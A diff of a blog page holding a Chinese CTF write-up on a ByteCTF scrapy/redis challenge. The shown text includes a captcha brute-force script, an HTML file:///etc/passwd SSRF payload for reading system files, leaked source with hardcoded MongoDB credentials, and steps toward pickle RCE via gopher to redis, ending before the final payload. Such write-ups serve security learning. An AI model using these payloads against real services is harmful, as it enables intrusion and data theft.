@@ -466,7 +466,43 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <a id="more"></a>
 
 <h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>首先题目本身给出了一个功能可以让我们输入url以及一个验证码，但是注意到这里cookie是flask的session,存储的内容与每次页面回显的验证码一致。所以首先我们可以找到减少后面的工作的方法,就是带上固定的cookie写脚本进行存储url的操作。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">URL=<span class="string">'http://39.102.69.151:30010/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies=&#123;<span class="string">'session'</span>:<span class="string">'eyJjb2RlIjoiZTFiMmQ5IiwidXNlciI6IjVhNTkwZjVhLTE2ZjgtMTFlYi1hYThhLTAyNDJhYzE0MDAwNiJ9.X5XSBA.z2Nn4le-aOsM8jg82j7gMzfzhSc'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(code)</span>:</span></span><br><span class="line">    a = string.digits + string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> a:</span><br><span class="line">                        p = i + j + k + m + n</span><br><span class="line">                        s = hashlib.md5(p.encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                        <span class="keyword">if</span> s == code:</span><br><span class="line">                            print(p)</span><br><span class="line">                            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">()</span>:</span></span><br><span class="line">    r=requests.get(URL,cookies=cookies)</span><br><span class="line">    varify=re.findall(<span class="string">r'&lt;span&gt;substr\(md5\(\$str\), 0, 6\) === (.*)&lt;/span&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> varify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(url,code)</span>:</span></span><br><span class="line">    r=requests.post(url=URL+<span class="string">'push'</span>,cookies=cookies,data=&#123;<span class="string">'url'</span>:url,<span class="string">'code'</span>:code&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"><span class="comment">#code=brute(send())</span></span><br><span class="line"><span class="comment">#print(code)</span></span><br><span class="line">push(<span class="string">'http://120.27.246.202/'</span>,code)</span><br><span class="line"><span class="comment">#push('http://127.0.0.1:','0AUDp')</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">import string, hashlib
+import requests
+import re
+import sys
+import time
+
+URL=&#39;http://39.102.69.151:30010/&#39;
+
+
+cookies={&#39;session&#39;:&#39;eyJjb2RlIjoiZTFiMmQ5IiwidXNlciI6IjVhNTkwZjVhLTE2ZjgtMTFlYi1hYThhLTAyNDJhYzE0MDAwNiJ9.X5XSBA.z2Nn4le-aOsM8jg82j7gMzfzhSc&#39;}
+def brute(code):
+    a = string.digits + string.ascii_lowercase + string.ascii_uppercase
+    for i in a:
+        for j in a:
+            for k in a:
+                for m in a:
+                    for n in a:
+                        p = i + j + k + m + n
+                        s = hashlib.md5(p.encode(&#39;utf-8&#39;)).hexdigest()[0:6]
+                        if s == code:
+                            print(p)
+                            return p
+
+
+def send():
+    r=requests.get(URL,cookies=cookies)
+    varify=re.findall(r&#39;&lt;span&gt;substr\(md5\(\$str\), 0, 6\) === (.*)&lt;/span&gt;&#39;,r.text)[0]
+    return varify
+
+
+def push(url,code):
+    r=requests.post(url=URL+&#39;push&#39;,cookies=cookies,data={&#39;url&#39;:url,&#39;code&#39;:code})
+    print(r.text)
+#code=brute(send())
+#print(code)
+push(&#39;http://120.27.246.202/&#39;,code)
+#push(&#39;http://127.0.0.1:&#39;,&#39;0AUDp&#39;)</code></pre>
 <p>爆破一次后就可继续用了。</p>
 <p>之后发现，当输入完url存储后，urllist中会存在我们刚刚输入的url。之后点击则会前往<code>/result?url=xxxx</code>.似乎是一个ssrf的点。</p>
 <p>第一天上午的话，感觉爬什么都爬不到。但是当时往自己的vps上打的时候倒是有意外的发现<br>当时的笔记:<br><img src="https://i.imgur.com/hiUBWKq.png" class="lazyload" data-srcset="https://i.imgur.com/hiUBWKq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
@@ -489,37 +525,134 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>此时已经知道href有猫腻了。然后出题人已经放出了第一个hint。就是尝试读源码。</p>
 <p>那么我们不妨尝试下，顺着这个href+file协议进行源码的阅读？</p>
 <h2 id="leak-source-code"><a href="#leak-source-code" class="headerlink" title="leak source code"></a>leak source code</h2><p>在自己的服务器上存储</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="html">&lt;html&gt;&lt;a href=&quot;file:///etc/passwd&quot;&gt;&lt;/a&gt;&lt;/html&gt;</code></pre>
 <p>接着上面的脚本跑一遍。一把梭解决问题。<br>再次访问<code>/result</code>。发现读到了<code>/etc/passwd</code></p>
 <p>既然如此，我们依次读下其他内容<br><code>/proc/self/cmdline</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash run.sh</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">/bin/bash run.sh</code></pre>
 <p><code>/proc/self/environ</code><br>得知当前PWD是<code>/code</code></p>
 <p>读<code>/code/run.sh</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">scrapy crawl byte</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">#!/bin/bash
+scrapy crawl byte</code></pre>
 <p>使用的是scrapy框架进行爬取。</p>
 <p>此时开始自己盲目的读结果发现啥都没读到,想了想发现这个爬虫bot可能只有这么一个命令在运行。那么我应该去查找scrapy的文档<br>我们找到scrapy官方文档</p>
 <p><img src="https://i.imgur.com/5ZlDlDG.png" class="lazyload" data-srcset="https://i.imgur.com/5ZlDlDG.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>显然我们只需读取<code>scrapy.cfg</code>就能拿到scrapy项目名并读取到下面所有文件。不过spider的名字似乎是自定义的</p>
 <p><img src="https://i.imgur.com/uXo8IiC.png" class="lazyload" data-srcset="https://i.imgur.com/uXo8IiC.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="https://i.imgur.com/zVeZub0.png" class="lazyload" data-srcset="https://i.imgur.com/zVeZub0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>前面命令行执行的是<code>scrapy crawl byte</code>那么可以确认spider的name是byte.文件名也可能是byte.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Automatically created by: scrapy startproject</span><br><span class="line">#</span><br><span class="line"># For more information about the [deploy] section see:</span><br><span class="line"># https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html</span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default &#x3D; bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line">#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;</span><br><span class="line">project &#x3D; bytectf</span><br></pre></td></tr></table></figure>
+<pre><code># Automatically created by: scrapy startproject
+#
+# For more information about the [deploy] section see:
+# https://scrapyd.readthedocs.io/en/latest/deploy.html
 
-<p>其他内容也都一并读取。<br>完整的文件我会放自己github上。包括redis跟mongodb的docker</p>
+[settings]
+default = bytectf.settings
+
+[deploy]
+#url = http://localhost:6800/
+project = bytectf</code></pre><p>其他内容也都一并读取。<br>完整的文件我会放自己github上。包括redis跟mongodb的docker</p>
 <p>此时我通过pipelines.py与settings.py分别得到了mongodb与redis的配置</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//pipelines.py</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        MONGODB_HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">'result'</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">'result'</span></span><br><span class="line">        MONGODB_USER = <span class="string">'N0rth3'</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">'E7B70D0456DAD39E22735E0AC64A69AD'</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">"%s:%d"</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line"></span><br><span class="line">        quote_info = dict(item)</span><br><span class="line">        print(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
+<pre><code class="python">//pipelines.py
+import pymongo
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//settings.py</span><br><span class="line">BOT_NAME = <span class="string">'bytectf'</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">'bytectf.spiders'</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">'bytectf.spiders'</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">'scrapy_redis'</span></span><br><span class="line">SCHEDULER = <span class="string">"scrapy_redis.scheduler.Scheduler"</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">"scrapy_redis.dupefilter.RFPDupeFilter"</span></span><br><span class="line">REDIS_HOST = <span class="string">'172.20.0.7'</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line"> <span class="string">'bytectf.pipelines.BytectfPipeline'</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+class BytectfPipeline:
 
+    def __init__(self):
+
+        MONGODB_HOST = &#39;127.0.0.1&#39;
+        MONGODB_PORT = 27017
+        MONGODB_DBNAME = &#39;result&#39;
+        MONGODB_TABLE = &#39;result&#39;
+        MONGODB_USER = &#39;N0rth3&#39;
+        MONGODB_PASSWD = &#39;E7B70D0456DAD39E22735E0AC64A69AD&#39;
+        mongo_client = pymongo.MongoClient(&quot;%s:%d&quot; % (MONGODB_HOST, MONGODB_PORT))
+        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)
+        mongo_db = mongo_client[MONGODB_DBNAME]
+        self.table = mongo_db[MONGODB_TABLE]
+
+
+
+    def process_item(self, item, spider):
+
+        quote_info = dict(item)
+        print(quote_info)
+        self.table.insert(quote_info)
+        return item</code></pre>
+<pre><code class="python">//settings.py
+BOT_NAME = &#39;bytectf&#39;
+SPIDER_MODULES = [&#39;bytectf.spiders&#39;]
+NEWSPIDER_MODULE = &#39;bytectf.spiders&#39;
+RETRY_ENABLED = False
+ROBOTSTXT_OBEY = False
+DOWNLOAD_TIMEOUT = 8
+USER_AGENT = &#39;scrapy_redis&#39;
+SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;
+DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;
+REDIS_HOST = &#39;172.20.0.7&#39;
+REDIS_PORT = 6379
+ITEM_PIPELINES = {
+ &#39;bytectf.pipelines.BytectfPipeline&#39;: 300,
+}
+</code></pre>
 <p>以及主要的爬虫逻辑。知道了文件读取的漏洞所在</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span><span class="params">(RedisSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'byte'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">'byte_start'</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">'//a/@href'</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'/'</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r'://'</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">'item'</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">'byte_url'</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">'byte_text'</span>] = base64.b64encode((response.text).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        item = response.meta[<span class="string">'item'</span>]</span><br><span class="line">        item[<span class="string">'byte_url'</span>] = response.request.url</span><br><span class="line">        item[<span class="string">'byte_text'</span>] = base64.b64encode((response.text).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import scrapy
+import re
+import base64
+from scrapy_redis.spiders import RedisSpider
+from bytectf.items import BytectfItem
 
+class ByteSpider(RedisSpider):
+    name = &#39;byte&#39;
+
+    def parse(self, response):
+        byte_item = BytectfItem()
+        byte_item[&#39;byte_start&#39;] = response.request.url
+        url_list = []
+        test = response.xpath(&#39;//a/@href&#39;).getall()
+        for i in test:
+            if i[0] == &#39;/&#39;:
+                url = response.request.url + i
+            else:
+                url = i
+            if re.search(r&#39;://&#39;,url):
+                r = scrapy.Request(url,callback=self.parse2,dont_filter=True)
+                r.meta[&#39;item&#39;] = byte_item
+                yield r
+            url_list.append(url)
+            if(len(url_list)&gt;3):
+                break
+        byte_item[&#39;byte_url&#39;] = response.request.url
+        byte_item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))
+        yield byte_item
+
+    def parse2(self,response):
+        item = response.meta[&#39;item&#39;]
+        item[&#39;byte_url&#39;] = response.request.url
+        item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))
+        yield item</code></pre>
 <p>可是这有什么用呢……我们一样不知道flag在哪。目前看来,如果flag在bot机器上,那么只有可能会是打redis。并且按照我自己的少数经验，一般是搭配pickle反序列化rce才有可能。但是这里并没有明显的pickle反序列化代码。</p>
 <p>此时陷入僵局，只有本地调试一下看看有没有意外发生了。</p>
 <h2 id="Run-it-locally"><a href="#Run-it-locally" class="headerlink" title="Run it locally"></a>Run it locally</h2><p>这道题最重要的一点恐怕就是本地跑了。毕竟此时我们对环境一无所知,我唯一能想到的getshell方法也只有pickle反序列化了。那么试试本地，看看有没有键存了pickle序列化后的数据？这样一来必然有某个地方存在反序列化。</p>
 <p>经过一番折腾后。我简单写了个起mongodb的docker.因为redis跟爬虫本地起比较轻松,我又不想改代码。<br>(后面比赛结束时写了个完整版的,直接起应该跟线上的bot+redis+mongo环境基本一致了)<br>docker-compose.yml</p>
-<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">mongodb:</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">mongo:4.2</span></span><br><span class="line">      <span class="attr">container_name:</span> <span class="string">py_db</span></span><br><span class="line">      <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">      <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">MONGO_INITDB_ROOT_USERNAME:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">MONGO_INITDB_ROOT_PASSWORD:</span> <span class="string">root</span> </span><br><span class="line">        <span class="attr">MONGO_INITDB_DATABASE:</span> <span class="string">result</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro</span></span><br></pre></td></tr></table></figure>
+<pre><code class="yml">version: &#39;3&#39;
+services:
+    mongodb:
+      image: mongo:4.2
+      container_name: py_db
+      restart: always
+      environment:
+        MONGO_INITDB_ROOT_USERNAME: root
+        MONGO_INITDB_ROOT_PASSWORD: root 
+        MONGO_INITDB_DATABASE: result
+      volumes:
+        - ./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro</code></pre>
 <p>同目录下mongo-init.js</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data=&#123;<span class="string">"test"</span>:<span class="string">"123"</span>&#125;<span class="comment">//just for test</span></span><br><span class="line">db.result.drop();</span><br><span class="line">db.result.insert(data);</span><br><span class="line">db.createUser(&#123;</span><br><span class="line">    user: <span class="string">"N0rth3"</span>,</span><br><span class="line">    pwd:  <span class="string">"E7B70D0456DAD39E22735E0AC64A69AD"</span>,</span><br><span class="line">    roles: [ &#123; <span class="attr">role</span>: <span class="string">"readWrite"</span>, <span class="attr">db</span>: <span class="string">"result"</span>, <span class="attr">collection</span>:<span class="string">"result"</span> &#125;]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">var data={&quot;test&quot;:&quot;123&quot;}//just for test
+db.result.drop();
+db.result.insert(data);
+db.createUser({
+    user: &quot;N0rth3&quot;,
+    pwd:  &quot;E7B70D0456DAD39E22735E0AC64A69AD&quot;,
+    roles: [ { role: &quot;readWrite&quot;, db: &quot;result&quot;, collection:&quot;result&quot; }]
+});</code></pre>
 <p>简单改下爬虫的redis/mongodb ip ,就能开跑了</p>
 <p><img src="https://i.imgur.com/znmnKI4.png" class="lazyload" data-srcset="https://i.imgur.com/znmnKI4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>然后此时我发现一点动静的都没有。感觉非常奇怪。倒是看到scrapy它在准备读<code>byte:start_urls</code></p>
@@ -527,7 +660,15 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>看了下报错。似乎是在执行redis的LPOP操作报错的。那可能是数据类型的问题了。找了下一篇文章发现了原因。</p>
 <p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571" target="_blank" rel="noopener">https://blog.csdn.net/zwq912318834/article/details/78854571</a><br>它爬虫的逻辑跟我们的基本一致。属于分布式爬虫。即等待redis中出现redis_key再进行爬取。<br>而这里因为不是简单的从字符串进行读取，而是从一个队列里读一个元素。那么自然不会读到内容了。</p>
 <p>期间,转战虚拟机起服务。这一次我们用脚本写入数据。其实就是执行lpush而已。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">redis_Host = <span class="string">"127.0.0.1"</span></span><br><span class="line">redis_key = <span class="string">'byte:start_urls'</span></span><br><span class="line">rediscli = redis.Redis(host = redis_Host, port = <span class="number">6379</span>, db = <span class="string">"0"</span>)</span><br><span class="line">rediscli.lpush(redis_key, <span class="string">"http://www.baidu.com"</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+import redis
+
+redis_Host = &quot;127.0.0.1&quot;
+redis_key = &#39;byte:start_urls&#39;
+rediscli = redis.Redis(host = redis_Host, port = 6379, db = &quot;0&quot;)
+rediscli.lpush(redis_key, &quot;http://www.baidu.com&quot;)</code></pre>
 <p>这时就可以成功写入,爬取数据，并将数据存进mongodb。<br>这里我再尝试打一遍redis跟mongodb。发现跟服务端远程是一致的。打redis会提前报错终止，打mongodb会有回显<br><img src="https://i.imgur.com/t0i6Z1n.png" class="lazyload" data-srcset="https://i.imgur.com/t0i6Z1n.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p><img src="https://i.imgur.com/0Py191w.png" class="lazyload" data-srcset="https://i.imgur.com/0Py191w.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>不过这里redis因为lpop这个操作。导致我写入的这个list很快就会消失。它存的也不是pickle数据。那么要怎么rce?此时再度陷入僵局</p>
@@ -542,9 +683,58 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>然后推测一波版本，这里我打远程用的protocol协议为2.0的pickle成功了。当时getshell没看python版本,估计是2.7.(scrapy 一般在2.7 或3.5/3.6跑)</p>
 <p>一个比较头疼的点是如何写入opcode的16进制数据。之前pwnhub6月赛时写pickle数据是因为crlf比较简单。可以直接加个引号括起来写。这里我们只能gopher打。那么转数据时出了不少麻烦。最后我简单改了下redis-ssrf这个脚本的内容。用python2 跑。确认它不会像python3那样自动转义我的16进制字符串。终于构造出可以打的payload</p>
 <p>python3 运行以得到pickle 16进制序列化数据。py2的直接写貌似有点问题。</p>
